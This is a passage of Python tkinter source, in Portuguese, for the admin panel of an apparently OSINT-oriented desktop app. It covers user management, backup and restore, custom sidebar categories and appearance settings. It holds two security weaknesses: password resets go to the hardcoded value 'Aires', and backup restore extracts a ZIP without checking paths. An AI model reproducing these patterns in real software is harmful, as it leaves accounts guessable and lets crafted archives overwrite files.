        b_save.configure(font=(FONT_MONO, 10, "bold"))
        self.pers_status = tk.Label(self.tab_pers, text="Move ▲▼ e guarda.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8))
        self.pers_status.pack(anchor="w", padx=16, pady=(0, 8))

    def refresh_personalizacao_lists(self):
        self.list_sidebar.delete(0, "end")
        for p in self.cfg.get("sidebar_order", []):
            # Verificar custom
            custom = next((c for c in self.cfg.get("custom_categories", []) if c.get("id") == p), None)
            if custom:
                display = f"{custom.get('icone','📁')}  {custom.get('nome', p)} [CUSTOM]"
            else:
                display = self.SIDEBAR_NAMES.get(p, p)
            self.list_sidebar.insert("end", display)
        self.list_invest.delete(0, "end")
        for t in self.cfg.get("investigacao_order", []):
            display = self.INVEST_NAMES.get(t, t)
            self.list_invest.insert("end", display)
        hidden = self.cfg.get("sidebar_hidden", [])
        if hidden:
            self.hidden_label.configure(text=", ".join(hidden[:5]) + (f" +{len(hidden)-5} mais" if len(hidden)>5 else ""))
        else:
            self.hidden_label.configure(text="Nenhum oculto")

    def move_up(self, listbox, order_list):
        sel = listbox.curselection()
        if not sel or sel[0]==0:
            return
        idx=sel[0]
        order_list[idx-1], order_list[idx] = order_list[idx], order_list[idx-1]
        self.refresh_personalizacao_lists()
        listbox.selection_set(idx-1)

    def move_down(self, listbox, order_list):
        sel = listbox.curselection()
        if not sel or sel[0]==len(order_list)-1:
            return
        idx=sel[0]
        order_list[idx], order_list[idx+1] = order_list[idx+1], order_list[idx]
        self.refresh_personalizacao_lists()
        listbox.selection_set(idx+1)

    def hide_selected_sidebar(self):
        sel = self.list_sidebar.curselection()
        if not sel:
            messagebox.showwarning("Aviso", "Seleciona um item do menu lateral para ocultar")
            return
        idx = sel[0]
        if idx >= len(self.cfg["sidebar_order"]):
            return
        page_id = self.cfg["sidebar_order"][idx]
        if page_id in ["UsuarioPage", "AdministracaoPage"]:
            messagebox.showerror("Erro", "Não podes ocultar Usuário ou Administração!")
            return
        if page_id not in self.cfg["sidebar_hidden"]:
            self.cfg["sidebar_hidden"].append(page_id)
        del self.cfg["sidebar_order"][idx]
        self.refresh_personalizacao_lists()

    def show_all_hidden(self):
        for h in self.cfg.get("sidebar_hidden", [])[:]:
            if h not in self.cfg["sidebar_order"]:
                self.cfg["sidebar_order"].append(h)
        self.cfg["sidebar_hidden"] = []
        self.refresh_personalizacao_lists()

    def reset_sidebar(self):
        self.cfg["sidebar_order"] = get_default_ui_config()["sidebar_order"] + [c.get("id") for c in self.cfg.get("custom_categories", [])]
        self.cfg["sidebar_hidden"] = []
        self.refresh_personalizacao_lists()

    def reset_invest(self):
        self.cfg["investigacao_order"] = get_default_ui_config()["investigacao_order"]
        self.refresh_personalizacao_lists()

    def save_and_apply_personalizacao(self):
        save_ui_config(self.cfg)
        try:
            self.app_ref.rebuild_sidebar()
            if "InvestigacaoPage" in self.app_ref.pages:
                self.app_ref.pages["InvestigacaoPage"].rebuild_tabs()
            self.pers_status.configure(text="✅ Guardado e aplicado!", fg="#00ff88")
            messagebox.showinfo("Guardado", "Personalização guardada!")
        except Exception as e:
            self.pers_status.configure(text=f"Erro: {e}", fg=ERROR)

    # ─── UTILIZADORES (movida de UsuarioPage) ───
    def build_users_tab(self):
        tk.Label(self.tab_users, text="GESTÃO DE UTILIZADORES (ADMIN)", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=16, pady=(16, 4))
        tk.Label(self.tab_users, text="Sistema com papéis: admin, user, investigador. Apenas admins podem gerir.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), wraplength=700, justify="left").pack(anchor="w", padx=16, pady=(0, 12))
        body = tk.Frame(self.tab_users, bg=BG)
        body.pack(fill="both", expand=True, padx=16, pady=6)
        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        left.pack(side="left", fill="both", expand=True, padx=(0, 8))
        tk.Label(left, text="LISTA DE UTILIZADORES", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=8)
        self.users_listbox = tk.Listbox(left, font=(FONT_MONO, 9), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=14)
        self.users_listbox.pack(fill="both", expand=True, padx=8, pady=4)
        self.users_listbox.bind("<<ListboxSelect>>", lambda e: self.on_user_select())
        right = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=300)
        right.pack(side="left", fill="y", padx=(8, 0))
        right.pack_propagate(False)
        tk.Label(right, text="NOVO UTILIZADOR", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=8)
        tk.Label(right, text="USERNAME", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w", padx=8, pady=(4, 2))
        self.new_user_entry = tk.Entry(right, font=(FONT_MONO, 10), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.new_user_entry.pack(fill="x", padx=8, pady=2, ipady=4)
        tk.Label(right, text="SENHA", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w", padx=8, pady=(4, 2))
        self.new_pass_entry = tk.Entry(right, show="●", font=(FONT_MONO, 10), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.new_pass_entry.pack(fill="x", padx=8, pady=2, ipady=4)
        tk.Label(right, text="FUNÇÃO", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w", padx=8, pady=(4, 2))
        self.new_role_var = tk.StringVar(value="user")
        role_menu = tk.OptionMenu(right, self.new_role_var, "user", "admin", "investigador")
        role_menu.configure(bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        role_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        role_menu.pack(fill="x", padx=8, pady=2)
        btn_create = tk.Button(right, text="➕ CRIAR UTILIZADOR", command=self.create_user)
        btn_create.pack(fill="x", padx=8, pady=10, ipady=6)
        style_button(btn_create)
        btn_create.configure(font=(FONT_MONO, 8, "bold"))
        btn_delete = tk.Button(right, text="🗑 ELIMINAR SELECIONADO", command=self.delete_user)
        btn_delete.pack(fill="x", padx=8, pady=4, ipady=5)
        btn_delete.configure(bg="#1a0a0f", fg=ERROR, relief="flat", font=(FONT_MONO, 8, "bold"))
        btn_reset_pw = tk.Button(right, text="🔑 RESET SENHA PARA 'Aires'", command=self.reset_user_password)
        btn_reset_pw.pack(fill="x", padx=8, pady=4, ipady=5)
        style_button(btn_reset_pw)
        self.user_detail_label = tk.Label(right, text="Seleciona um utilizador\n\nDica: Administração completa aqui", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7), wraplength=280, justify="left")
        self.user_detail_label.pack(fill="x", padx=8, pady=12)

    def refresh_users_list(self):
        self.users_listbox.delete(0, "end")
        users = load_users()
        for uname, data in users.items():
            if isinstance(data, dict):
                role = data.get("role","user")
                created = data.get("created_at","—")[:10]
                self.users_listbox.insert("end", f"{uname} [{role}] - {created}")
            else:
                self.users_listbox.insert("end", f"{uname} [legacy]")

    def on_user_select(self):
        sel = self.users_listbox.curselection()
        if not sel:
            return
        users = load_users()
        unames = list(users.keys())
        if sel[0] >= len(unames):
            return
        uname = unames[sel[0]]
        data = users.get(uname, {})
        if isinstance(data, dict):
            info = f"User: {uname}\nRole: {data.get('role','user')}\nCriado: {data.get('created_at','—')}\nÚltimo login: {data.get('last_login','—')}\nFoto: {'Sim' if data.get('photo') else 'Não'}"
            self.user_detail_label.configure(text=info)

    def create_user(self):
        uname = self.new_user_entry.get().strip()
        pwd = self.new_pass_entry.get().strip()
        role = self.new_role_var.get()
        if not uname or not pwd:
            messagebox.showwarning("Aviso", "Username e senha obrigatórios.")
            return
        users = load_users()
        if uname in users:
            messagebox.showerror("Erro", "Utilizador já existe.")
            return
        users[uname] = {"password": hash_password(pwd), "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "last_login": "Nunca", "password_changed": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "photo": "", "role": role}
        save_users(users)
        self.new_user_entry.delete(0, "end")
        self.new_pass_entry.delete(0, "end")
        self.refresh_users_list()
        messagebox.showinfo("Criado", f"Utilizador {uname} criado.")

    def delete_user(self):
        sel = self.users_listbox.curselection()
        if not sel:
            messagebox.showwarning("Aviso", "Seleciona um utilizador.")
            return
        users = load_users()
        unames = list(users.keys())
        uname = unames[sel[0]]
        if uname == self.username:
            messagebox.showerror("Erro", "Não podes eliminar a tua própria conta.")
            return
        if not messagebox.askyesno("Confirmar", f"Eliminar {uname}?"):
            return
        del users[uname]
        save_users(users)
        self.refresh_users_list()
        messagebox.showinfo("Eliminado", f"{uname} eliminado.")

    def reset_user_password(self):
        sel = self.users_listbox.curselection()
        if not sel:
            messagebox.showwarning("Aviso", "Seleciona um utilizador.")
            return
        users = load_users()
        unames = list(users.keys())
        uname = unames[sel[0]]
        if not messagebox.askyesno("Reset", f"Resetar senha de {uname} para 'Aires'?"):
            return
        users[uname]["password"] = hash_password("Aires")
        users[uname]["password_changed"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        save_users(users)
        messagebox.showinfo("Reset", f"Senha de {uname} resetada para 'Aires'.")

    # ─── APLICAÇÃO ───
    def build_app_tab(self):
        top = tk.Frame(self.tab_app, bg=BG)
        top.pack(fill="x", padx=16, pady=12)
        tk.Label(top, text="CONFIGURAÇÃO DA APLICAÇÃO", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(anchor="w")
        tk.Label(top, text="Gestão global, backup, reset e opções avançadas", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", pady=(2,0))

        body = tk.Frame(self.tab_app, bg=BG)
        body.pack(fill="both", expand=True, padx=16, pady=6)

        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        left.pack(side="left", fill="both", expand=True, padx=(0,8))

        tk.Label(left, text="INFORMAÇÃO DO SISTEMA", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=10, pady=8)
        info_text = scrolledtext.ScrolledText(left, font=(FONT_MONO, 8), bg=BG, fg=TEXT, height=8, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        info_text.pack(fill="x", padx=8, pady=4)
        sys_info = f"BASE_DIR: {BASE_DIR}\nPython: {platform.python_version()}\nOS: {platform.system()} {platform.release()}\nHostname: {socket.gethostname()}\nUtilizador: {self.username}\nData: {datetime.datetime.now()}\n\nFicheiros JSON:\n"
        for f in [USERS_FILE, CASOS_FILE, CLIENTES_FILE, BUSCAS_FILE, UI_CONFIG_FILE, IPTV_FILE, RADIO_FILE, MUSIC_FILE, FILMES_FILE]:
            exists = "✅" if os.path.exists(f) else "❌"
            size = f"{os.path.getsize(f)//1024}KB" if os.path.exists(f) else "0KB"
            sys_info += f"{exists} {os.path.basename(f)} ({size})\n"
        info_text.insert("1.0", sys_info)
        info_text.configure(state="disabled")

        # App config
        cfg_frame = tk.Frame(left, bg=PANEL_BG)
        cfg_frame.pack(fill="x", padx=8, pady=10)
        tk.Label(cfg_frame, text="OPÇÕES GLOBAIS", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(anchor="w", pady=4)
        self.app_name_entry = tk.Entry(cfg_frame, bg=BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 9))
        self.app_name_entry.pack(fill="x", ipady=4, pady=2)
        self.app_name_entry.insert(0, self.cfg.get("app_config", {}).get("app_name", "OSINIT // AIRES"))

        self.auto_backup_var = tk.BooleanVar(value=self.cfg.get("app_config", {}).get("auto_backup", False))
        tk.Checkbutton(cfg_frame, text="Backup automático ao sair", variable=self.auto_backup_var, bg=PANEL_BG, fg=TEXT, selectcolor=BG, activebackground=PANEL_BG, font=(FONT_MONO, 8)).pack(anchor="w", pady=2)

        self.debug_var = tk.BooleanVar(value=self.cfg.get("app_config", {}).get("debug_mode", False))
        tk.Checkbutton(cfg_frame, text="Modo Debug (logs verbosos)", variable=self.debug_var, bg=PANEL_BG, fg=TEXT, selectcolor=BG, activebackground=PANEL_BG, font=(FONT_MONO, 8)).pack(anchor="w", pady=2)

        b_save_app = tk.Button(cfg_frame, text="💾 GUARDAR CONFIG APLICAÇÃO", command=self.save_app_config)
        b_save_app.pack(fill="x", pady=8, ipady=6)
        style_button(b_save_app)

        right = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=280)
        right.pack(side="left", fill="y", padx=(8,0))
        right.pack_propagate(False)
        tk.Label(right, text="AÇÕES RÁPIDAS", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=8)

        for txt, cmd in [
            ("📦 BACKUP TOTAL (ZIP)", self.backup_all),
            ("📥 RESTAURAR BACKUP", self.restore_backup),
            ("📂 ABRIR PASTA DADOS", self.open_data_folder),
            ("🧹 LIMPAR CACHE TEMP", self.clear_temp),
            ("🔄 RESET UI CONFIG", self.reset_ui_config),
            ("⚠️ RESET TOTAL DADOS", self.reset_all_data),
        ]:
            b = tk.Button(right, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=6, cursor="hand2", anchor="w")
            b.pack(fill="x", padx=8, pady=3)

        self.app_status = tk.Label(right, text="Pronto", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7), wraplength=260, justify="left")
        self.app_status.pack(fill="x", padx=8, pady=10)

    def save_app_config(self):
        self.cfg["app_config"]["app_name"] = self.app_name_entry.get().strip() or "OSINIT // AIRES"
        self.cfg["app_config"]["auto_backup"] = self.auto_backup_var.get()
        self.cfg["app_config"]["debug_mode"] = self.debug_var.get()
        save_ui_config(self.cfg)
        self.app_status.configure(text="✅ Config aplicação guardada!", fg="#00ff88")
        try:
            self.app_ref.title(self.cfg["app_config"]["app_name"] + f" [{self.username}]")
        except:
            pass

    def backup_all(self):
        try:
            import zipfile
            backup_path = filedialog.asksaveasfilename(defaultextension=".zip", filetypes=[("ZIP","*.zip")], initialfile=f"osinit_backup_{datetime.datetime.now().strftime('%Y%m%d_%H%M')}.zip")
            if not backup_path:
                return
            with zipfile.ZipFile(backup_path, 'w') as z:
                for fname in os.listdir(BASE_DIR):
                    if fname.endswith(".json") or fname.endswith(".txt"):
                        fpath = os.path.join(BASE_DIR, fname)
                        if os.path.isfile(fpath):
                            z.write(fpath, fname)
                # profile photos
                if os.path.exists(PROFILE_DIR):
                    for root, dirs, files in os.walk(PROFILE_DIR):
                        for f in files:
                            fp = os.path.join(root, f)
                            arc = os.path.relpath(fp, BASE_DIR)
                            z.write(fp, arc)
            self.app_status.configure(text=f"✅ Backup criado: {os.path.basename(backup_path)}", fg="#00ff88")
            messagebox.showinfo("Backup", f"Backup criado em:\n{backup_path}")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def restore_backup(self):
        try:
            import zipfile
            zip_path = filedialog.askopenfilename(filetypes=[("ZIP","*.zip")])
            if not zip_path:
                return
            if not messagebox.askyesno("Restaurar", "Isto vai substituir ficheiros JSON atuais. Continuar?\nRecomenda fazer backup antes."):
                return
            with zipfile.ZipFile(zip_path, 'r') as z:
                z.extractall(BASE_DIR)
            self.app_status.configure(text="✅ Backup restaurado! Reinicia a app.", fg="#00ff88")
            messagebox.showinfo("Restaurado", "Backup restaurado! Reinicia a aplicação para aplicar.")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def open_data_folder(self):
        try:
            if platform.system() == "Windows":
                os.startfile(BASE_DIR)
            elif platform.system() == "Darwin":
                subprocess.Popen(["open", BASE_DIR])
            else:
                subprocess.Popen(["xdg-open", BASE_DIR])
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def clear_temp(self):
        try:
            removed = 0
            for d in [TEMP_MUSIC_DIR]:
                if os.path.exists(d):
                    for f in os.listdir(d):
                        fp = os.path.join(d, f)
                        try:
                            os.remove(fp)
                            removed += 1
                        except:
                            pass
            self.app_status.configure(text=f"🧹 {removed} ficheiros temp removidos", fg=ACCENT)
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def reset_ui_config(self):
        if not messagebox.askyesno("Reset UI", "Resetar toda personalização de layout?"):
            return
        default = get_default_ui_config()
        self.cfg["sidebar_order"] = default["sidebar_order"]
        self.cfg["sidebar_hidden"] = []
        self.cfg["investigacao_order"] = default["investigacao_order"]
        save_ui_config(self.cfg)
        self.app_ref.rebuild_sidebar()
        self.refresh_personalizacao_lists()
        self.app_status.configure(text="🔄 UI resetada", fg=ACCENT)

    def reset_all_data(self):
        if not messagebox.askyesno("⚠️ RESET TOTAL", "ATENÇÃO: Isto apaga TODOS os casos, clientes, registos, IPTV, Radio, etc.\nTens a certeza?"):
            return
        if not messagebox.askyesno("Confirmar 2x", "Última confirmação: APAGAR TUDO?"):
            return
        try:
            for fp in [CASOS_FILE, CLIENTES_FILE, BUSCAS_FILE, IPTV_FILE, RADIO_FILE, MUSIC_FILE, FILMES_FILE, GAMES_FILE, GAMES_SOURCES_FILE, GAMES_DOWNLOADS_FILE]:
                if os.path.exists(fp):
                    save_json(fp, [])
            save_json(UI_CONFIG_FILE, get_default_ui_config())
            self.cfg = load_ui_config()
            self.app_status.configure(text="⚠️ Dados resetados!", fg=ERROR)
            messagebox.showinfo("Reset", "Todos dados foram limpos. Reinicia a app.")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    # ─── CATEGORIAS ───
    def build_categorias_tab(self):
        top = tk.Frame(self.tab_cats, bg=BG)
        top.pack(fill="x", padx=16, pady=12)
        tk.Label(top, text="GESTÃO DE CATEGORIAS PERSONALIZADAS", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(anchor="w")
        tk.Label(top, text="Cria categorias novas que aparecem no menu lateral. Podes usar para organizar ferramentas, projetos, etc.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8), wraplength=800, justify="left").pack(anchor="w", pady=(2,0))

        body = tk.Frame(self.tab_cats, bg=BG)
        body.pack(fill="both", expand=True, padx=16, pady=6)

        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        left.pack(side="left", fill="both", expand=True, padx=(0,8))
        tk.Label(left, text="CATEGORIAS CUSTOM", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=8)
        self.cats_listbox = tk.Listbox(left, font=(FONT_MONO, 9), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=12)
        self.cats_listbox.pack(fill="both", expand=True, padx=8, pady=4)
        self.cats_listbox.bind("<<ListboxSelect>>", lambda e: self.on_cat_select())
        btns = tk.Frame(left, bg=PANEL_BG)
        btns.pack(fill="x", padx=8, pady=6)
        for txt, cmd in [("▲", lambda: self.move_cat(-1)), ("▼", lambda: self.move_cat(1)), ("🗑 REMOVER", self.remove_cat)]:
            b = tk.Button(btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=5, cursor="hand2")
            b.pack(side="left", padx=2, fill="x", expand=True)

        right = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=320)
        right.pack(side="left", fill="y", padx=(8,0))
        right.pack_propagate(False)
        tk.Label(right, text="NOVA / EDITAR CATEGORIA", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(pady=8)

        for label, key in [("ID (sem espaços, ex: custom_finance)", "id"), ("NOME (ex: Finanças)", "nome"), ("ÍCONE (emoji, ex: 💰)", "icone"), ("DESCRIÇÃO", "descricao")]:
            tk.Label(right, text=label, bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w", padx=8, pady=(6,2))
            ent = tk.Entry(right, font=(FONT_MONO, 9), bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
            ent.pack(fill="x", padx=8, pady=2, ipady=4)
            setattr(self, f"cat_{key}", ent)

        btns2 = tk.Frame(right, bg=PANEL_BG)
        btns2.pack(fill="x", padx=8, pady=12)
        b_add = tk.Button(btns2, text="➕ ADICIONAR CATEGORIA", command=self.add_cat)
        b_add.pack(fill="x", pady=3, ipady=6)
        style_button(b_add)
        b_upd = tk.Button(btns2, text="💾 ATUALIZAR SELECIONADA", command=self.update_cat)
        b_upd.pack(fill="x", pady=3, ipady=6)
        style_button(b_upd)
        b_clear = tk.Button(btns2, text="🧹 LIMPAR CAMPOS", command=self.clear_cat_fields)
        b_clear.pack(fill="x", pady=3, ipady=4)
        b_clear.configure(bg=BTN_BG, fg=TEXT_DIM, relief="flat", font=(FONT_MONO, 7, "bold"))

        self.cats_status = tk.Label(right, text="Pronto", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7), wraplength=300, justify="left")
        self.cats_status.pack(fill="x", padx=8, pady=8)

        tk.Label(right, text="DICA: Ícones sugeridos: 💼 📊 🎯 🔧 📁 🚀 💡 🛡 📦", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 6), wraplength=300, justify="left").pack(fill="x", padx=8, pady=4)

    def refresh_cats_list(self):
        self.cats_listbox.delete(0, "end")
        for c in self.cfg.get("custom_categories", []):
            self.cats_listbox.insert("end", f"{c.get('icone','📁')} {c.get('nome','Sem nome')} ({c.get('id','')})")

    def on_cat_select(self):
        sel = self.cats_listbox.curselection()
        if not sel:
            return
        idx = sel[0]
        cats = self.cfg.get("custom_categories", [])
        if idx >= len(cats):
            return
        cat = cats[idx]
        self.cat_id.delete(0, "end")
        self.cat_id.insert(0, cat.get("id",""))
        self.cat_nome.delete(0, "end")
        self.cat_nome.insert(0, cat.get("nome",""))
        self.cat_icone.delete(0, "end")
        self.cat_icone.insert(0, cat.get("icone",""))
        self.cat_descricao.delete(0, "end")
        self.cat_descricao.insert(0, cat.get("descricao",""))

    def clear_cat_fields(self):
        for k in ["id","nome","icone","descricao"]:
            getattr(self, f"cat_{k}").delete(0, "end")
        self.cat_icone.insert(0, "📁")

    def add_cat(self):
        cid = self.cat_id.get().strip()
        nome = self.cat_nome.get().strip()
        icone = self.cat_icone.get().strip() or "📁"
        desc = self.cat_descricao.get().strip()
        if not cid or not nome:
            messagebox.showwarning("Aviso", "ID e Nome obrigatórios")
            return
        if not cid.startswith("custom_"):
            cid = "custom_" + cid.replace(" ", "_").lower()
            self.cat_id.delete(0, "end")
            self.cat_id.insert(0, cid)
        # Verificar duplicado
        if any(c.get("id")==cid for c in self.cfg.get("custom_categories", [])):
            messagebox.showerror("Erro", "ID já existe! Usa outro ID ou atualiza.")
            return
        new_cat = {"id": cid, "nome": nome, "icone": icone, "descricao": desc, "created": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        self.cfg["custom_categories"].append(new_cat)
        if cid not in self.cfg["sidebar_order"]:
            self.cfg["sidebar_order"].append(cid)
        save_ui_config(self.cfg)
        self.refresh_cats_list()
        self.refresh_personalizacao_lists()
        self.app_ref.rebuild_sidebar()
        self.cats_status.configure(text=f"✅ Categoria {nome} adicionada!", fg="#00ff88")
        self.clear_cat_fields()

    def update_cat(self):
        sel = self.cats_listbox.curselection()
        if not sel:
            messagebox.showwarning("Aviso", "Seleciona uma categoria para atualizar")
            return
        idx = sel[0]
        cid = self.cat_id.get().strip()
        nome = self.cat_nome.get().strip()
        icone = self.cat_icone.get().strip() or "📁"
        desc = self.cat_descricao.get().strip()
        if not cid or not nome:
            messagebox.showwarning("Aviso", "ID e Nome obrigatórios")
            return
        cats = self.cfg.get("custom_categories", [])
        if idx < len(cats):
            cats[idx]["nome"] = nome
            cats[idx]["icone"] = icone
            cats[idx]["descricao"] = desc
            # Se ID mudou, atualizar também sidebar_order
            if cats[idx]["id"] != cid:
                old_id = cats[idx]["id"]
                cats[idx]["id"] = cid
                # Atualizar sidebar_order
                if old_id in self.cfg["sidebar_order"]:
                    pos = self.cfg["sidebar_order"].index(old_id)
                    self.cfg["sidebar_order"][pos] = cid
            save_ui_config(self.cfg)
            self.refresh_cats_list()
            self.refresh_personalizacao_lists()
            self.app_ref.rebuild_sidebar()
            self.cats_status.configure(text=f"💾 Categoria {nome} atualizada!", fg=ACCENT)

    def remove_cat(self):
        sel = self.cats_listbox.curselection()
        if not sel:
            return
        idx = sel[0]
        cats = self.cfg.get("custom_categories", [])
        if idx >= len(cats):
            return
        cat = cats[idx]
        if not messagebox.askyesno("Remover", f"Remover categoria '{cat.get('nome')}'?"):
            return
        cid = cat.get("id")
        del cats[idx]
        if cid in self.cfg["sidebar_order"]:
            self.cfg["sidebar_order"].remove(cid)
        if cid in self.cfg.get("sidebar_hidden", []):
            self.cfg["sidebar_hidden"].remove(cid)
        save_ui_config(self.cfg)
        self.refresh_cats_list()
        self.refresh_personalizacao_lists()
        self.app_ref.rebuild_sidebar()
        self.cats_status.configure(text=f"🗑 Categoria removida", fg=ERROR)
        self.clear_cat_fields()

    def move_cat(self, direction):
        sel = self.cats_listbox.curselection()
        if not sel:
            return
        idx = sel[0]
        new_idx = idx + direction
        cats = self.cfg.get("custom_categories", [])
        if new_idx < 0 or new_idx >= len(cats):
            return
        cats[idx], cats[new_idx] = cats[new_idx], cats[idx]
        # Também mover no sidebar_order se ambos existem
        order = self.cfg["sidebar_order"]
        try:
            id1 = cats[new_idx].get("id")  # after swap, this was idx
            id2 = cats[idx].get("id")
            # Actually swap order positions if both in order
            if id1 in order and id2 in order:
                i1 = order.index(id1)
                i2 = order.index(id2)
                order[i1], order[i2] = order[i2], order[i1]
        except:
            pass
        save_ui_config(self.cfg)
        self.refresh_cats_list()
        self.cats_listbox.selection_set(new_idx)
        self.app_ref.rebuild_sidebar()

    # ─── APARÊNCIA ───
    def build_aparencia_tab(self):
        top = tk.Frame(self.tab_appear, bg=BG)
        top.pack(fill="x", padx=16, pady=12)
        tk.Label(top, text="APARÊNCIA E PERSONALIZAÇÃO VISUAL", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(anchor="w")
        tk.Label(top, text="Temas, cores, fontes e estilo visual — guarda em ui_config.json", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", pady=(2,0))

        body = tk.Frame(self.tab_appear, bg=BG)
        body.pack(fill="both", expand=True, padx=16, pady=6)

        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        left.pack(side="left", fill="both", expand=True, padx=(0,8))

        tk.Label(left, text="CORES E TEMA", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w", padx=10, pady=8)

        # Accent presets
        tk.Label(left, text="COR DE DESTAQUE (ACCENT)", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w", padx=10, pady=(6,2))
        accent_frame = tk.Frame(left, bg=PANEL_BG)
        accent_frame.pack(fill="x", padx=10, pady=4)
        self.accent_var = tk.StringVar(value=self.cfg.get("appearance", {}).get("accent", "#00e5ff"))
        presets = ["#00e5ff", "#00ff88", "#ff3b5c", "#ffb700", "#9d4edd", "#ff6b35", "#ffffff"]
        for color in presets:
            b = tk.Button(accent_frame, bg=color, width=3, height=1, relief="flat", bd=0, cursor="hand2", command=lambda c=color: self.accent_var.set(c))
            b.pack(side="left", padx=3)

        tk.Label(left, text="ACCENT HEX:", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w", padx=10, pady=(8,2))
        self.accent_entry = tk.Entry(left, textvariable=self.accent_var, bg=BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 9))
        self.accent_entry.pack(fill="x", padx=10, ipady=4, pady=2)

        tk.Label(left, text="TEMA", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w", padx=10, pady=(12,2))
        self.theme_var = tk.StringVar(value=self.cfg.get("appearance", {}).get("theme", "dark"))
        theme_menu = tk.OptionMenu(left, self.theme_var, "dark", "darker", "blue_dark", "green_dark")
        theme_menu.configure(bg=BTN_BG, fg=TEXT, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        theme_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        theme_menu.pack(fill="x", padx=10, pady=2)

        tk.Label(left, text="FONTE MONO", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(anchor="w", padx=10, pady=(8,2))
        self.font_var = tk.StringVar(value=self.cfg.get("appearance", {}).get("font", "Consolas"))
        font_menu = tk.OptionMenu(left, self.font_var, "Consolas", "Courier", "Monospace", "Fira Code", "JetBrains Mono")
        font_menu.configure(bg=BTN_BG, fg=TEXT, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        font_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        font_menu.pack(fill="x", padx=10, pady=2)

        b_save_appear = tk.Button(left, text="💾 GUARDAR APARÊNCIA", command=self.save_appearance)
        b_save_appear.pack(fill="x", padx=10, pady=12, ipady=8)
        style_button(b_save_appear)

